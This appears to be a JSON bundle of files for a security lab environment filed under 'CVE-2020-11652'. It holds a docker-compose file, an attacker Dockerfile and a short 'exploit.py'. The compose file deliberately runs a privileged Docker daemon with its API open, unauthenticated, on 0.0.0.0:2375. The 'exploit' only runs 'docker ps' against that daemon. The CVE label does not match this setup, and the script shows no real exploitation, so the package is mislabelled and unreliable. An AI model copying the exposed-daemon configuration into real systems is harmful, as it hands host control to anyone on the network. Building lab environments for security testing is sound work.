{
    "files": [
        {
            "location": "./../../dockers/CVE-2020-11652/custom_no_tool/docker-compose.yml",
            "content": "services:\n  vulnerable-docker:\n    image: docker:19.03.5\n    privileged: true\n    command: [\"dockerd\", \"-H\", \"tcp://0.0.0.0:2375\", \"-H\", \"unix:///var/run/docker.sock\"]\n    ports:\n      - \"2375:2375\"\n    healthcheck:\n      test: [\"CMD\", \"curl\", \"-f\", \"http://localhost:2375/_ping\"]\n      interval: 2s\n      timeout: 5s\n      retries: 20\n  attacker:\n    build:\n      context: ./attacker\n      dockerfile: Dockerfile\n    environment:\n      DOCKER_HOST: tcp://vulnerable-docker:2375\n    depends_on:\n      vulnerable-docker:\n        condition: service_healthy"
        },
        {
            "location": "./../../dockers/CVE-2020-11652/custom_no_tool/attacker/Dockerfile",
            "content": "FROM docker:20.10\nRUN apk add --no-cache python3 py3-pip curl && pip3 install --no-cache-dir requests\nCOPY exploit.py /exploit.py\nENTRYPOINT [\"python3\", \"/exploit.py\"]"
        },
        {
            "location": "./../../dockers/CVE-2020-11652/custom_no_tool/attacker/exploit.py",
            "content": "import os\nimport time\nimport subprocess\n\ndef docker_ps():\n    try:\n        result = subprocess.check_output([\"docker\", \"ps\"], stderr=subprocess.STDOUT)\n        print(result.decode())\n        return True\n    except Exception as e:\n        print(f\"Docker command failed: {e}\")\n        return False\n\nmax_wait = 60\nstart = time.time()\nwhile time.time() - start < max_wait:\n    if docker_ps():\n        break\n    time.sleep(2)\nelse:\n    print(\"Failed to communicate with Docker daemon within timeout.\")\n"
        }
    ],
    "directory_tree": "./../../dockers/CVE-2020-11652/custom_no_tool"
}